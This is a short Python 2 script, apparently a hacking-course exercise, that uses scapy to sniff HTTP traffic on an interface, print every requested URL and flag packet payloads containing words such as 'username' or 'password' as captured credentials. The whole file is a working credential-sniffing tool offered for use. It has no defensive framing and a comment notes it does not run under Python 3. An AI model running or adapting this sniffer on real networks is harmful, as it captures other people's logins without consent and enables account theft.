import scapy.all as scapy
from scapy.layers import http  # pip install scapy_http

# from scapy_http import http

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path         #for detecting urls


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #prn it will excute a function which we will  give it after capturing packet
      
      
def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
            # print(packet[scapy.Raw].load)  #finding and printing Raw layer  
            load = packet[scapy.Raw].load
            keywords=["username", "user", "login" ,"password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
                    
                    
                                                                          #store =dont store memory on this pc

def process_sniffed_packet(packet):      # for http  only
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP REQUEST >> \n"+url)
        
        login_info=get_login_info(packet)
        if login_info:
            print("\n\n[+] possible username/password >>"+login_info+"\n\n")
       


sniff("eth0")      #----interfaceon which you want to sniff


## imp -----> python sniffer.py
##code is not in python3